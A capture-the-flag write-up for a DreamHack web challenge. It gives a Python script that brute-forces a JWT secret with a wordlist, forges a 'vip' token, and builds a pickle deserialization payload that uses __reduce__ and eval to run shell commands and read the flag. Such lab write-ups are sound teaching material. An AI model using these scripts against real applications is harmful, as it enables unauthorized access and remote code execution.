+++
date = '2025-11-24T21:47:12+07:00'
title = 'DreamHack - Special Letter Translator Web Challenge Writeup'
tags = ['DreamHack', 'CTFs']
description = 'One day, Swap found a special letter service! Special You need special permission to decipher a letter! ~ swap: Hmm... Please help Swap to seize VIP rights and decipher the letter.'
draft = false

[cover]
  image = '/images/posts/dreamhack-writeup.jpg'
  alt = 'DreamHack - Special Letter Translator'
  caption = 'DreamHack - Special Letter Translator'
  relative = false
+++

## Goal

Gaining privileges and leveraging RCE to get the flag.

## My Solution

Based on the description and the source code the first thing we have to do is gain VIP role, the `SECRET_KEY` in `app.py`:

```python
SECRET_KEY = "SECRET_KEY"
```

Try logged in as `guest` with password `guest` check this is the wrong secret key, then we have to brute-force the secret key in order to create our own JWT token, my brute-force Python script:

```python
import jwt
import os

GUEST_TOKEN = "LOGGED_IN_TOKEN"

def crack_secret_key(token, wordlist_path=None):
    print(f"Attempting to crack JWT secret...")

    candidates = []

    if wordlist_path and os.path.exists(wordlist_path):
        print(f"Loading wordlist: {wordlist_path}")
        try:
            with open(wordlist_path, 'r', encoding='latin-1') as f:
                candidates.extend([line.strip() for line in f])
        except Exception as e:
            print(f"Error reading wordlist: {e}")

    candidates = list(set(candidates))

    for key in candidates:
        try:
            jwt.decode(token, key, algorithms=["HS256"])
            print(f"\n[+] SUCCESS! Secret Key Found: '{key}'")
            return key
        except jwt.InvalidTokenError:
            continue

    print("\nailed to crack secret key with provided list.")
    return None

crack_secret_key(GUEST_TOKEN, 'rockyou.txt')
```

I used the wordlist `rockyou.txt` and found the secret key:
![Guide image](/images/posts/dreamhack-special-letter-translator-1.png)
Create the new JWT token with the secret with role `vip`:

```json
{
    "username": "admin_swap",
    "role": "vip"
}
```

![Guide image](/images/posts/dreamhack-special-letter-translator-4.png)

Then the next vulnerable code we have to exploit is this:

```python
letter = base64.b64encode(dill.dumps(info)).decode('utf-8')
```

`dill` library uses `pickle` and it is well-known of RCE vulnerability. Create the payload:

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        p="os.popen('whoami').read()"
        return (eval,(p,))


info = {
    "name": Exploit(),
    "tendinous": Exploit()
}

print(base64.b64encode(pickle.dumps(info)).decode('utf-8'))
```

Got the payload and use the Decode the Special Letter:
![Guide image](/images/posts/dreamhack-special-letter-translator-2.png)
Now to got the flag just change `whoami` to `cat ./flag.txt`:
![Guide image](/images/posts/dreamhack-special-letter-translator-3.png)
